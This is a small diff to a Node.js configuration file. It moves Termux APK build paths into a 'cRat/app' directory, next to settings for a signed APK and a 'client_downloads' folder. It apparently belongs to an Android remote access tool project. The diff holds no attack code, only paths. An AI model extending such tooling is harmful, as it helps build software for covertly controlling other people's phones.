@@ -11,8 +11,8 @@ exports.termux = '/data/data/com.termux/files/home'
 exports.apkBuildPath = path.join(__dirname, '../assets/webpublic/build.apk')
 exports.apkSignedBuildPath = path.join(__dirname, '../assets/webpublic/build.apk')
 
-exports.termuxApkBuildPath = exports.termux + '/build/build.apk'
-exports.termuxApkSignedBuildPath = exports.termux + '/build/build.apk'
+exports.termuxApkBuildPath = exports.termux + '/cRat/app/build.apk'
+exports.termuxApkSignedBuildPath = exports.termux + '/cRat/app/build.apk'
 
 exports.downloadsFolder = '/client_downloads'
 exports.downloadsFullPath = path.join(__dirname, '../assets/webpublic', exports.downloadsFolder)
